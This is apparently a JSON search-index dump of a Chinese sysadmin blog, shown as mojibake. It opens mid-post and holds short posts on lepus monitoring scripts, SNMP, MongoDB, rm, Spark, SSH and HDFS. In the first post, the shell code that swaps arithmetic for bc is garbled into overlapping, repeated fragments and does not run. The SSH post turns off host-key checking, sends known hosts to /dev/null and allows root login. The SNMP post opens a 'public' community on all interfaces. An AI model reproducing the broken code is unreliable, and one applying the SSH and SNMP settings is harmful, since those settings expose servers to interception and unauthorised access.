ï¼Œæäº†åŠå¤©ï¼Œåˆå’¨è¯¢ç¾¤é‡Œä¹Ÿæ²¡æœ‰ç±»ä¼¼çš„ç»å†ï¼Œæ— æœã€‚ 2.æ— å¥ˆæ±‚æ•™ç¾¤ä¸»ï¼Œä»–ä¹Ÿæ²¡æœ‰å¤´ç»ªï¼Œåªæ˜¯ç»™äº†æç¤ºï¼Œçœ‹çœ‹check_os.shè¾“å‡ºå˜é‡æœ‰æ²¡æœ‰é—®é¢˜ã€‚çœ‹æ¥åªèƒ½è‡ªå·±ç ”ç©¶ä¸€ä¸‹ï¼Œè‡ªå·±ä¿®æ”¹check_os.shè„šæœ¬ï¼Œçœ‹çœ‹å“ªä¸€æ­¥è¾“å‡ºæœ‰é—®é¢˜äº†ã€‚ 3.å…¶ä¸­è°ƒè¯•æ€»è¾“å‡ºæœ‰ä»¥ä¸‹å†…å®¹ï¼š 30 (diskIOIndex)) check_os.sh: 77: check_os.sh: arithmetic expression: expecting primary: â€œ-â€æˆ‘ä¸€çœ‹ä¿¡æ¯ï¼Œå¤§æ¦‚æ˜¯ä¸è®¡ç®—æœ‰å…³çš„æ•°å­¦ç¬¦å·ä¸å¯¹ï¼Œåœ¨shellä¸­è®¡ç®—å¾€å¾€ä»¤äººå¤´ç—›çš„é—®é¢˜ã€‚åŸæ¥77ï¼Œ78è¡Œæ˜¯è¿™æ ·è¿›è¡Œè®¡ç®—çš„ï¼š77 #disk_io_reads=((((((disk_io_reads_2 - disk_io_reads_1)) 78 #disk_io_writes=(($disk_io_writes_2 - disk_io_writes_1)) åœ¨å­shellä¸­è¿›è¡Œè®¡ç®—æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åŠæ³•ï¼Œä½†åœ¨è¿™é‡Œç«Ÿç„¶æ— æ³•è®¡ç®—ï¼Œå¤šå°æœºå™¨ä¹Ÿæ˜¯è¿™ä¸ªç»“æœã€‚ 4.æœ€åæˆ‘ä¿®æ”¹ä»¥bcçš„æ–¹æ³•æ¥è®¡ç®—ï¼Œç»“æœæ­£ç¡®ã€‚ç•Œé¢è¾“å‡ºä¹ŸæˆåŠŸï¼Œå¾—å‡ºç›¸åº”çš„ç»“æœä¹Ÿè¾“å‡ºæ­£å¸¸äº†ã€‚é™¤äº†è¿™ä¸¤è¡Œè®¡ç®—ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶å®ƒ4è¡Œç±»ä¼¼çš„ï¼Œä¹Ÿä¸€å¹¶ä¿®æ”¹ï¼Œå…±æœ‰8è¡Œï¼Œå‰é¢æ˜¯è¡Œå·ï¼Œå¯èƒ½ä¸ä¸€å®šå¯¹åº”ã€‚ 77 disk_io_reads=`echo \"disk_io_reads_2 - diskioreads1&quot;âˆ£bcâ€˜78diskiowrites=â€˜echo&quot;disk_io_reads_1&quot;|bc` 78 disk_io_writes=` echo &quot;diskâ€‹iâ€‹â€‹oâ€‹râ€‹â€‹eadsâ€‹1â€‹â€‹&quot;âˆ£bcâ€˜78diskâ€‹iâ€‹â€‹oâ€‹wâ€‹â€‹rites=â€˜echo&quot;disk_io_writes_2 - diskiowrites1&quot;âˆ£bcâ€˜83diskioreadstotal=â€˜echo&quot;disk_io_writes_1&quot;|bc` 83 disk_io_reads_total=`echo &quot;diskâ€‹iâ€‹â€‹oâ€‹wâ€‹â€‹ritesâ€‹1â€‹â€‹&quot;âˆ£bcâ€˜83diskâ€‹iâ€‹â€‹oâ€‹râ€‹â€‹eadsâ€‹tâ€‹â€‹otal=â€˜echo&quot;disk_io_reads_total+diskioreads&quot;âˆ£bcâ€˜84diskiowritestotal=â€˜echo&quot;disk_io_reads&quot;|bc` 84 disk_io_writes_total=`echo &quot;diskâ€‹iâ€‹â€‹oâ€‹râ€‹â€‹eads&quot;âˆ£bcâ€˜84diskâ€‹iâ€‹â€‹oâ€‹wâ€‹â€‹ritesâ€‹tâ€‹â€‹otal=â€˜echo&quot;disk_io_writes_total+diskiowrites&quot;âˆ£bcâ€˜104inbytes=â€˜echo&quot;disk_io_writes&quot;|bc` 104 in_bytes=`echo &quot;diskâ€‹iâ€‹â€‹oâ€‹wâ€‹â€‹rites&quot;âˆ£bcâ€˜104inâ€‹bâ€‹â€‹ytes=â€˜echo&quot;in_bytes_2-inbytes1&quot;âˆ£bcâ€˜105outbytes=â€˜echo&quot;in_bytes_1&quot;|bc` 105 out_bytes=`echo &quot;inâ€‹bâ€‹â€‹ytesâ€‹1â€‹â€‹&quot;âˆ£bcâ€˜105outâ€‹bâ€‹â€‹ytes=â€˜echo&quot;out_bytes_2-outbytes1&quot;âˆ£bcâ€˜109netinbytestotal=â€˜echo&quot;out_bytes_1&quot;|bc` 109 net_in_bytes_total=`echo &quot;outâ€‹bâ€‹â€‹ytesâ€‹1â€‹â€‹&quot;âˆ£bcâ€˜109netâ€‹iâ€‹â€‹nâ€‹bâ€‹â€‹ytesâ€‹tâ€‹â€‹otal=â€˜echo&quot;net_in_bytes_total+inbytes&quot;âˆ£bcâ€˜110netoutbytestotal=â€˜echo&quot;in_bytes&quot;|bc` 110 net_out_bytes_total=`echo &quot;inâ€‹bâ€‹â€‹ytes&quot;âˆ£bcâ€˜110netâ€‹oâ€‹â€‹utâ€‹bâ€‹â€‹ytesâ€‹tâ€‹â€‹otal=â€˜echo&quot;net_out_bytes_total+$out_bytes&quot;|bc`","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"lepus","slug":"lepus","permalink":"https://wangxiuwen.github.io/tags/lepus/"}],"author":"wangxiuwen"},{"title":"snmp","slug":"history/tech/5953c4d0c2b92f5665eeda20","date":"2016-04-03T03:41:33.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda20/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda20/","excerpt":"","text":"èƒŒæ™¯ï¼šæœºæˆ¿æ–°å¢äº†å‡ å°ubuntuæœåŠ¡å™¨ï¼Œéœ€è¦ç”¨å·²æœ‰çš„cactiæ¥ç›‘æµ‹å®ƒä»¬ï¼Œæ‰€ä»¥è¦åœ¨æ–°æœåŠ¡å™¨ä¸Šå®‰è£…å’Œé…ç½®SNMPåè®®ã€‚åŠ¨æœºï¼šæˆ‘å‚è€ƒç½‘ä¸Šå¾ˆå¤šèµ„æ–™å®‰è£…å’Œé…ç½®SNMPï¼Œæ²¡æå®šï¼Œäºæ˜¯è‡ªå·±ç ”ç©¶äº†ä¸€ä¸‹å¦‚ä½•é…ç½®ï¼Œæœ€ç»ˆé¡ºåˆ©å®Œæˆï¼Œæ‰€ä»¥åˆ†äº«ä¸€ä¸‹ã€‚SNMPå®‰è£…è¿è¡Œå¦‚ä¸‹ä¸¤ä¸ªå‘½ä»¤apt-get install snmp apt-get install snmpd é¡ºåˆ©è¿è¡Œå®Œæ¯•ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æµ‹è¯•ä¸€ä¸‹lsof -i:161å¦‚æœè¾“å‡ºäº†æ­£åœ¨è¿è¡Œsnmpåè®®ï¼Œä¾¿è¯´æ˜å®‰è£…OKã€‚SNMPé…ç½®ï¼ˆé‡ç‚¹ï¼‰æˆ‘çš„SNMPé…ç½®æ–‡ä»¶/etc/snmp/snmpd.confä¸ç½‘ä¸Šæ—©å¹´çš„ä¸€äº›èµ„æ–™ä¸åŒï¼Œä¸»è¦æ˜¯ å‹æ ¹æ²¡æœ‰å‡ºç°com2secï¼Œä¸‹é¢é™„ä¸Šæˆ‘çš„snmpd.confçš„å‰åŠéƒ¨åˆ†ï¼š-----------------------------------ä¸‹é¢æ˜¯snmpd.conf---------------------------------############################################################################### EXAMPLE.conf: An example configuration file for configuring the Net-SNMP agent (â€˜snmpdâ€™) See the â€˜snmpd.conf(5)â€™ man page for details Some entries are deliberately commented out, and will need to be explicitly activated############################################################################### AGENT BEHAVIOUR Listen for connections from the local system only#agentAddress udp:127.0.0.1:161 Listen for connections on all interfaces (both IPv4 and IPv6)agentAddress udp:161,udp6::161############################################################################### SNMPv3 AUTHENTICATION Note that these particular settings donâ€™t actually belong here. They should be copied to the file /var/lib/snmp/snmpd.conf and the passwords changed, before being uncommented in that file only. Then restart the agent createUser authOnlyUser MD5 â€œremember to change this passwordâ€ createUser authPrivUser SHA â€œremember to change this one tooâ€ DES createUser internalUser MD5 â€œthis is only ever used internally, but still change the passwordâ€ If you also change the usernames (which might be sensible), then remember to update the other occurances in this example config file to match.############################################################################### ACCESS CONTROL # system + hrSystem groups only view systemonly included .1.3.6.1.2.1.1view systemonly included .1.3.6.1.2.1.25.1view systemonly included .1 80# Full access from the local host#rocommunity public localhost# Default access to basic system inforocommunity public default -V systemonly # Full access from an example network # Adjust this network address to match your local # settings, change the community string, # and check the 'agentAddress' setting above #rocommunity secret 10.0.0.0/16 # Full read-only access for SNMPv3 rouser authOnlyUser# Full write access for encrypted requests# Remember to activate the â€˜createUserâ€™ lines above#rwuser authPrivUser priv Itâ€™s no longer typically necessary to use the full â€˜com2sec/group/accessâ€™ configuration ruser and rcommunity, together with suitable views, should cover most requirements-----------------------------------ä¸Šé¢æ˜¯snmpd.conf---------------------------------æˆ‘çš„ç›®çš„æ˜¯è¿›è¡Œè¿œç¨‹SNMPè¿æ¥ï¼Œæ‰€ä»¥éœ€è¦åšå¦‚ä¸‹çš„ä¿®æ”¹ï¼šå°†ä¸‹é¢è¿™ä¸€è¡ŒagentAddress udp:127.0.0.1:161æ³¨é‡Šæ‰ï¼Œå³#agentAddress udp:127.0.0.1:161ç„¶åå°†åŸæ¥çš„è¿™ä¸€è¡Œ#agentAddress udp:161,udp6::161å»æ‰æ³¨é‡Šï¼Œå³agentAddress udp:161,udp6::161è¿™æ ·ä¾¿å¯ä»¥å®ç°snmpçš„è¿œç¨‹ç›‘å¬äº†ã€‚ä½†ä¿®æ”¹åcactiæœåŠ¡å™¨è¿˜æ˜¯æ— æ³•ç›‘æµ‹åˆ°CPUã€å†…å­˜ã€æµé‡çš„æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦å†åšå¦‚ä¸‹ä¿®æ”¹ï¼šåœ¨snmpd.confä¸­æ‰¾åˆ°ä¸‹é¢çš„å†…å®¹view systemonly included .1.3.6.1.2.1.1view systemonly included .1.3.6.1.2.1.25.1åœ¨ä¸‹é¢åŠ ä¸Šä¸€è¡Œview systemonly included .1 80è¿™æ ·å°±å…è®¸ç›‘å¬æ‰€æœ‰è®¾å¤‡äº†ã€‚å®Œæˆæ‰€æœ‰ä¿®æ”¹åï¼Œé‡å¯snmpservice snmpd restartæœ¬åœ°æµ‹è¯•SNMPæ˜¯å¦ç›‘æµ‹å„ç±»æŒ‡æ ‡çš„æ–¹æ³•ï¼šè¿è¡Œå¦‚ä¸‹å‘½ä»¤snmpwalk -v 2c -c public localhostå¦‚æœè¾“å‡ºç»“æœæœ‰å¥½å¤šé¡µå¥½å¤šé¡µï¼Œåº”è¯¥æ˜¯è®¾ç½®æˆåŠŸäº†ï¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"lepus è¿æ¥mongodb 3.0å‡ºé”™","slug":"history/tech/5953c4d0c2b92f5665eeda1f","date":"2016-04-03T02:38:17.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda1f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda1f/","excerpt":"","text":"æ­¤é—®é¢˜çš„æƒ…å¢ƒï¼šä½¿ç”¨çš„mongodbçš„ç‰ˆæœ¬ä¸º3.0.x, å› ä¸ºä¸ºç”Ÿäº§ç¯å¢ƒï¼Œä¸å¯è½»æ˜“åšç‰ˆæœ¬é™çº§æ“ä½œpymongo 2.7æ˜¯æ— æ³•è¿æ¥çš„ï¼Œæœ‰æ–‡ç« æœ‰æåˆ°ç›´æ¥ä¿®æ”¹APIçš„ä½¿ç”¨å³å¯ã€‚(ä¸»è¦å†…å®¹æ˜¯ï¼šConnectionç»§æ‰¿è‡ªMongoClient)æœ¬äººæ²¡æœ‰æµ‹è¯•ç›´æ¥ä¿®æ”¹lepus+pymongo 2.7ç‰ˆæœ¬çš„APIæ˜¯å¦å¯ç”¨ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªè¡Œæµ‹è¯•ã€‚éœ€è¦å®‰è£…pymongo 3.2 è¿™é‡Œä¸è¦å†ä½¿ç”¨lepuså®‰è£…æ–‡æ¡£ä¸­æåˆ°çš„pymongo 2.7ç›‘æ§è´¦å·çš„æˆæƒï¼šå› ä¸ºéœ€è¦è·å–serverStatus, éœ€è¦ç»™è¿æ¥è´¦å·æˆäºˆclusterAdminçš„è§’è‰²ã€‚MongoDBçš„æ–‡æ¡£ä¸­å¯ä»¥æŸ¥çœ‹å„å†…ç½®è§’è‰²å¯¹åº”çš„æƒé™ã€‚ä¿®æ”¹lepusæ–‡ä»¶check_mongodb.pyè¿›å…¥åˆ°lepusçš„å®‰è£…ç›®å½•/usr/local/lepusä¿®æ”¹æ–‡ä»¶ check_mongodb.pyå› ä¸ºConnectionåœ¨æ–°ç‰ˆæœ¬ä¸­å·²ç»å»æ‰äº†ï¼Œæ‰€ä»¥æ”¹ç”¨MongoClientconnect = pymongo.MongoClient(host,int(port))è·å–serverStatusçš„ä»£ç ï¼Œè‹¥ç›´æ¥ä½¿ç”¨BSONçš„æ–¹å¼è·å–ï¼Œå§‹ç»ˆæŠ¥è®¤è¯é—®é¢˜ï¼Œå½“æ—¶ä¿®æ”¹å¤ªå¿«äº†ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æƒé™é—®é¢˜ï¼Œç°åœ¨ä¹Ÿä¸å¤ªæƒ³é€€å›å»å†æµ‹è¯•äº†ã€‚æœ‰å…´è¶£çš„å¯ä»¥æµ‹è¯•ä¸‹ï¼Œæ¬¢è¿åˆ†äº«ã€‚serverStatus=db.command(â€˜serverStatusâ€™)serverStatus_2=db.command(â€˜serverStatusâ€™)æ³¨æ„è°ƒæ•´connect = 1çš„ä½ç½®ï¼Œå› ä¸ºæ­¤å¤„è·å–serverStatusçš„æ—¶å€™ï¼Œæ²¡æœ‰è·å–replicateçš„ä¿¡æ¯ï¼Œå› æ­¤ä»éœ€è¦ä¿è¯è¿æ¥å¯ç”¨ã€‚indexCounteråœ¨3.0ç‰ˆæœ¬ä¸­å·²ç»å»æ‰äº†ï¼ŒMongoDBå®˜æ–¹æ–‡æ¡£æœ‰è¯´æ˜ã€‚å› æ­¤ç›¸å…³çš„å‚æ•°å‡æ— æ³•è·å–äº†ï¼Œç›´æ¥èµ‹å€¼æ•°å­—0.indexCounters_accesses = 0indexCounters_hits = 0indexCounters_misses = 0indexCounters_resets = 0indexCounters_missRatio = 0è·å–replStatusçš„çŠ¶æ€ï¼šåœ¨ç¬¬äºŒæ®µtryä»£ç ä¸­æ·»åŠ ï¼šreplStatus=db.command(â€˜replSetGetStatusâ€™)repl=replStatusåˆ°æ­¤ï¼Œå·®ä¸å¤šä¿®æ”¹å®Œäº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"lepus","slug":"lepus","permalink":"https://wangxiuwen.github.io/tags/lepus/"}],"author":"wangxiuwen"},{"title":"mysql æŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda1e","date":"2016-04-02T20:54:43.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda1e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda1e/","excerpt":"","text":"sudo apt-get install libmysqlclient-devpip install mysql-python","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"linuxä¸‹rmå‘½ä»¤åˆ é™¤æ–‡ä»¶åä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦çš„æ–‡ä»¶","slug":"history/tech/5953c4d0c2b92f5665eeda1d","date":"2016-04-02T03:34:01.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda1d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda1d/","excerpt":"","text":"åˆ é™¤å¸¦â€œ-â€çš„æ–‡ä»¶åçš„æ–¹æ³•2. åˆ é™¤åŒ…å«å…¶å®ƒç‰¹æ®Šå­—ç¬¦çš„æ–‡ä»¶3. åˆ é™¤ç³»ç»Ÿæ‰“ä¸å‡ºçš„ä¹±ç æ–‡ä»¶å1. åˆ é™¤å¸¦â€œ-â€çš„æ–‡ä»¶åçš„æ–¹æ³•å¤§éƒ¨åˆ†æ˜¯ç”±äºè¯¯æ“ä½œçš„åŸå› ï¼Œäº§ç”Ÿäº†ä¸€äº› ç‰¹æ®Šå­—ç¬¦çš„æ–‡ä»¶ å¦‚ -foorm --helpç”¨æ³•ï¼šrm â€¦ ç›®å½•â€¦Remove (unlink) the FILE(s).-d, --directory unlink FILE, even if it is a non-empty directory(super-user only; this works only if your systemsupports unlink' for nonempty directories) -f, --force ignore nonexistent files, never prompt -i, --interactive prompt before any removal --no-preserve-root do not treat/â€™ specially (the default)â€“preserve-root fail to operate recursively on `/â€™-r, -R, --recursive remove the contents of directories recursively-v, --verbose explain what is being doneâ€“help æ˜¾ç¤ºæ­¤å¸®åŠ©ä¿¡æ¯å¹¶ç¦»å¼€â€“version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶ç¦»å¼€è¦åˆ é™¤ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºâ€˜-â€™çš„æ–‡ä»¶ (ä¾‹å¦‚â€˜-fooâ€™)ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å…¶ä¸­ä¸€ç§æ–¹æ³•ï¼šrm â€“ -foorm ./-fooè¯·æ³¨æ„ï¼Œå¦‚æœä½¿ç”¨ rm æ¥åˆ é™¤æ–‡ä»¶ï¼Œé€šå¸¸ä»å¯ä»¥å°†è¯¥æ–‡ä»¶æ¢å¤åŸçŠ¶ã€‚å¦‚æœæƒ³ä¿è¯è¯¥æ–‡ä»¶çš„å†…å®¹æ— æ³•è¿˜åŸï¼Œè¯·è€ƒè™‘ä½¿ç”¨ shredã€‚åˆ é™¤åŒ…å«å…¶å®ƒç‰¹æ®Šå­—ç¬¦çš„æ–‡ä»¶å¯¹äºå«æœ‰å…¶å®ƒç‰¹æ®Šå­—ç¬¦çš„æ–‡ä»¶åï¼Œå¦‚&lt;&gt;!ç­‰ï¼Œå¯ç”¨â€œâ€è½¬ä¹‰ç¬¦æˆ–â€œâ€åŒå¼•å·å¼•èµ·æ§åˆ¶å¦‚åä¸ºâ€œ&gt;â€æˆ–â€œâ€rm &gt;rm â€œ*â€3. åˆ é™¤ç³»ç»Ÿæ‰“ä¸å‡ºçš„ä¹±ç æ–‡ä»¶åç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶åå…¨æ˜¯ä¹±ç çš„æ–‡ä»¶ï¼Œæ ¹æœ¬æ— ä»ä¸‹æ‰‹è¿›è¡Œåˆ é™¤ï¼ˆç³»ç»Ÿæ‰“ä¸å‡ºä¹±ç ç¬¦å·ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»¥ä¸‹çš„æ­ªæ‹›ä¾‹å¦‚è¿™ä¸ªä¹±ç çš„æ–‡ä»¶æ˜¯luanma.txtï¼Œå½“ç„¶è¯¥ä¾‹å‡è®¾luanmaä¾¿æ˜¯å„ç§å¥‡å½¢æ€ªçŠ¶çš„ä¹±ç ï¼Œå‘µå‘µï½ï½æˆ‘ä»¬å¯ä»¥ç”¨rm *æå®š#cd xxxè¿›å…¥ä¹±ç æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•#rm *è¿™ä¸ªå‘½ä»¤è¡¨ç¤ºåˆ é™¤è¯¥ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå½“ç„¶æœ€ç»ˆç›®çš„ä¸æ˜¯åˆ é™¤æ‰€æœ‰æ–‡ä»¶å•¦ï½ï½ï¼Œè¾“å…¥å‘½ä»¤å›è½¦åç³»ç»Ÿåœ¨åˆ é™¤æ¯ä¸ªæ–‡ä»¶éƒ½æç¤ºæ˜¯å¦åˆ é™¤è¿™ä¸ªæ–‡ä»¶ï¼Œå…¶ä»–ä¸ç›¸å…³çš„æ–‡ä»¶å…¨éƒ¨éƒ½è¾“å…¥â€œnâ€å›è½¦è·³è¿‡ä¸åˆ é™¤ï¼Œç›´åˆ°æˆ‘ä»¬çš„ç›®æ ‡å‡ºç°rm: remove regular empty file `luanma.txtâ€™?å“ˆå“ˆï¼Œè¿™æ˜¯æˆ‘ä»¬æœæ–­åœ°è¾“å…¥â€œyâ€ï¼Œå›è½¦ï¼Œå°†è¿™ä¸ªå¯æ¨çš„æ–‡ä»¶å¹²æ‰ï¼ä¸è¿‡è¿™ä¸ªæ–¹æ³•è¦è§†ç³»ç»Ÿè€Œå®šï¼Œè¦è°¨æ…ä½¿ç”¨ï¼Œä¸Šé¢ä¾‹å­ä½¿ç”¨çš„æ˜¯redhatï¼Œæœ‰äº›linuxçš„å‘è¡Œç‰ˆæœ¬rmå‘½ä»¤æ²¡æœ‰æç¤ºåŠŸèƒ½ï¼Œè¾“å…¥rm *å°±ç›´æ¥æŠŠæ‰€æœ‰æ–‡ä»¶å¹²æ‰äº†ï¼Œæ‰€ä»¥ç”¨ä¹‹å‰å…ˆæ–°å»ºä¸€ä¸ªç›®å½•æµ‹è¯•ä¸€ä¸‹ä»¥é˜²ä¸‡ä¸€ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"spark å¯åŠ¨slaveæŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda1b","date":"2016-04-01T04:22:40.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda1b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda1b/","excerpt":"","text":"è®¾ç½®SPARK_LOCAL_IPå˜é‡WARN util.Utils: Service â€˜sparkWorkerâ€™ could not bind on port 0. Attempting port 1.vim /usr/local/spark-1.6.0-bin-hadoop2.6SPARK_LOCAL_IP=192.168.200.111","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"spark","slug":"spark","permalink":"https://wangxiuwen.github.io/tags/spark/"}],"author":"wangxiuwen"},{"title":"Permanently added (RSA) to the list of known hosts","slug":"history/tech/5953c4d0c2b92f5665eeda1c","date":"2016-03-31T20:11:03.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda1c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda1c/","excerpt":"","text":"ä¿®æ”¹/etc/ssh/sshd-configæ–‡ä»¶ï¼Œå°†å…¶ä¸­çš„PermitRootLogin noä¿®æ”¹ä¸ºyesï¼ŒPubkeyAuthentication yesä¿®æ”¹ä¸ºnoï¼ŒAuthorizedKeysFile .ssh/authorized_keyså‰é¢åŠ ä¸Š#å±è”½æ‰ï¼ŒPasswordAuthentication noAre you sure you want to continue connecting (yes/no)?1ã€è¿™ä¸ªæ˜¯sshå®‰å…¨è®¤è¯æ˜¯çš„ä¸€ä¸ªRSAè®¤è¯ã€‚æ­¤å¤„å¿…é¡»é€‰æ‹©yesæ‰èƒ½è¿æ¥ã€‚ç¬¬ä¸€æ¬¡yesåï¼Œä»–ä¼šè¯¢é—®ä½ æ˜¯å¦æ°¸ä¹…æŠŠè¿™ä¸ªRSAè®¤è¯åŠ å…¥æœ¬åœ°ï¼Œé€‰æ‹©yesåï¼Œä»¥åä¸ä¼šå†å‡ºç°æé†’ã€‚æ¯æ¬¡ç™»é™†åªéœ€è¦è¾“å…¥å¯†ç å³å¯ã€‚2ã€ä¹Ÿå¯ä»¥ä¸ç”¨è¾“å…¥1ä¸­çš„yesï¼Œä½†æ˜¯éœ€è¦ä¿®æ”¹æœ¬æœºé…ç½®ã€‚1/etc/ssh/ssh_config ä¸­çš„2 StrictHostKeyChecking ask æ”¹æˆ3StrictHostKeyChecking no vi /etc/ssh/ssh_configæœ€åæœ‰ä¸¤è¡Œæ˜¯StrictHostKeyChecking noUserKnownHostsFile /dev/null","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"hdfs åŸºæœ¬å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eeda1a","date":"2016-03-31T03:55:15.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda1a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda1a/","excerpt":"","text":"HDFSåŸºæœ¬å‘½ä»¤:hadoop fs -cmdcmd: å…·ä½“çš„æ“ä½œï¼ŒåŸºæœ¬ä¸Šä¸UNIXçš„å‘½ä»¤è¡Œç›¸åŒargs:å‚æ•°HDFSèµ„æºURIæ ¼å¼ï¼šscheme://authority/pathschemeï¼šåè®®åï¼Œfileæˆ–hdfsauthorityï¼šnamenodeä¸»æœºåpathï¼šè·¯å¾„ç¤ºä¾‹ï¼šhdfs://localhost:9000/user/chunk/test.txtå‡è®¾å·²ç»åœ¨core-site.xmlé‡Œé…ç½®äº† fs.default.name=hdfs://localhost:9000ï¼Œåˆ™ä»…ä½¿ç”¨/user/chunk/test.txtå³å¯ã€‚hdfsé»˜è®¤å·¥ä½œç›®å½•ä¸º /user/USERï¼ŒUSERæ˜¯å½“å‰çš„ç™»å½•ç”¨æˆ·åã€‚HDFSå‘½ä»¤ç¤ºä¾‹ï¼šhadoop fs -mkdir /user/trunkhadoop fs -ls /userhadoop fs -lsr /user (é€’å½’çš„)hadoop fs -put test.txt /user/trunkhadoop fs -put test.txt . (å¤åˆ¶åˆ°hdfså½“å‰ç›®å½•ä¸‹ï¼Œé¦–å…ˆè¦åˆ›å»ºå½“å‰ç›®å½•)hadoop fs -get /user/trunk/test.txt . (å¤åˆ¶åˆ°æœ¬åœ°å½“å‰ç›®å½•ä¸‹)hadoop fs -cat /user/trunk/test.txthadoop fs -tail /user/trunk/test.txt (æŸ¥çœ‹æœ€å1000å­—èŠ‚)hadoop fs -rm /user/trunk/test.txthadoop fs -help ls 